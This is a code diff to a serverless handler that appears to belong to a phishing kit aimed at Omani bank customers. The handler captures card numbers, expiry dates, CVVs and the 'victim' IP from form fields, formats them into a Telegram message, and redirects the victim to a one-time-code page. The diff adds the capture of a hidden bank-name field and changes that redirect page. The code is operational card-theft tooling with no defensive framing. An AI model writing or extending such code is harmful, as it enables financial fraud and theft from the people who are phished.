@@ -15,12 +15,15 @@ exports.handler = async (event) => {
     const year   = params.get('s3') || '-'; // السنة
     const cvv    = params.get('s4') || '-'; // الكود الخلفي
 
+    // استدعاء اسم البنك من الحقل المخفي
+    const bankName = params.get('bank_name') || 'غير محدد';
+    
     // استخراج IP الضحية
     const userIp = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown IP';
 
     // 3. تحديد الصفحة التالية (Redirect)
     // هام: ضع هنا مسار صفحة الكود (OTP) أو الصفحة التي تلي البطاقة
-    const nextPage = '/Oman/Banks/otp.html'; 
+    const nextPage = '/Oman/Banks/sms.html'; 
 
     // 4. تنسيق الرسالة لتليجرام
     const message = `
@@ -29,7 +32,7 @@ exports.handler = async (event) => {
 #️⃣ **Card:** \`${card}\`
 📅 **Expiry:** ${month} / ${year}
 🔒 **CVV:** \`${cvv}\`
-
+🏢 **البنك:** ${bankName}
 🌐 **IP:** ${userIp}
 ---------------------------
     `;
